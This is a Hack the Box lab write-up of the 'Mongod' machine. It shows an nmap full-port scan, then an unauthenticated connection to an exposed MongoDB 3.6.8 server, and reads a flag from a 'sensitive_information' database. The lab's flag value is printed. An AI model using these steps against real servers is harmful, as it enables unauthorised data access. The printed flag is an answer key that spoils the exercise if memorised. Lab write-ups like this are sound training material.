Hack the Box
Starting Point

Mongod

10.129.228.30

*** run nmap with -p- as first nmap scan only returned 1 open port.
*** so we scan all ports to see if any are open other than most common
nmap -p- -v -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/mongod 10.129.228.30

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
|_mongodb-databases: ERROR: Script execution failed (use -d to debug)
|_mongodb-info: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


$ docker run -it --entrypoint "/bin/bash" ubuntu:20.04
Unable to find image 'ubuntu:20.04' locally                                                                                                                                                                        
20.04: Pulling from library/ubuntu                                                                                                                                                                                 
fb0a6f6b1798: Pull complete 
Digest: sha256:f8f658407c35733471596f25fdb4ed748b80e545ab57e84efbdb1dbbb01bd70e                                                                                                                                    
Status: Downloaded newer image for ubuntu:20.04                                                                                                                                                                    
root@f7e704e4b4bd:/# sudo apt update                                                                                                                                                                               
bash: sudo: command not found                                                                                                                                                                                      
root@f7e704e4b4bd:/# apt update                                                                                                
mongo mongodb://10.129.228.30                                                                                                                                                                 
MongoDB shell version v3.6.8                                                                                                                                                                                       
connecting to: mongodb://10.129.228.30                                                                                                                                                                             
Implicit session: session { "id" : UUID("6f44555e-8885-4614-813a-2c139fe5f8a2") }                                                                                                                                  
MongoDB server version: 3.6.8                                                                                                                                                                                      
Welcome to the MongoDB shell.                                                                                                                                                                                      
For interactive help, type "help".                                                                                                                                                                                 
For more comprehensive documentation, see                                                                                                                                                                          
        http://docs.mongodb.org/                                                                                                                                                                                   
Questions? Try the support group                                                                                                                                                                                   
        http://groups.google.com/group/mongodb-user                                                                                                                                                                
Server has startup warnings:                                                                                                                                                                                       
2023-06-18T02:49:51.159+0000 I STORAGE  [initandlisten]                                                                                                                                                            
2023-06-18T02:49:51.159+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine                                                            
2023-06-18T02:49:51.159+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem                                                                                        
2023-06-18T02:49:54.788+0000 I CONTROL  [initandlisten]                                                                                                                                                            
2023-06-18T02:49:54.788+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.                                                                                                
2023-06-18T02:49:54.788+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.                                                                               
2023-06-18T02:49:54.788+0000 I CONTROL  [initandlisten]                                                                                                                                                            
> show dbs;                                                                                                                                                                                                        
admin                  0.000GB                                                                                                                                                                                     
config                 0.000GB                                                                                                                                                                                     
local                  0.000GB                                                                                                                                                                                     
sensitive_information  0.000GB                                                                                                                                                                                     
users                  0.000GB                                                                                                                                                                                     
> use sensitive_information;                                                                                                                                                                                       
switched to db sensitive_information                                                                                                                                                                               
> show collections;                                                                                                                                                                                                
flag                                                                                                                                                                                                               
> db.flag.find().pretty();                                                                                                                                                                                         
{                                                                                                                                                                                                                  
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),                                                                                                                                                              
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"                                                                                                                                                                
}                                                                                                                                                                                                                  
>                                                                                                                                                                                                                                                                                                      